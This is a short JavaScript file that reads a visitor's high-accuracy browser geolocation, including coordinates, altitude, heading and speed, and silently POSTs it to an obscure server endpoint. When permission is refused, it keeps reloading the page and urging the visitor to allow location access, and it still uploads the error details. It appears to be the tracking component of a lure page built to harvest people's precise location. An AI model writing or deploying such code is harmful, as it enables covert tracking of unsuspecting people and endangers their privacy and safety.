function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }


  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: '/rxWyhjKl',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, Flag: 1},
      success: function(){popup();},
      mimeType: 'text'
    });
  };
}


function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      // location.reload(true);
      // window.location.reload();
      browser.tabs.reload();
      break;
		case error.POSITION_UNAVAILABLE:
      var unavailable = 'Location information is unavailable';
      // location.reload(true);
      location.reload(true);
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
      location.reload(true);
			break;
		case error.UNKNOWN_ERROR:
      var unknown = 'An unknown error occurRED';
      location.reload(true);
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/rxWyhjKl',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown, Flag: 0},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
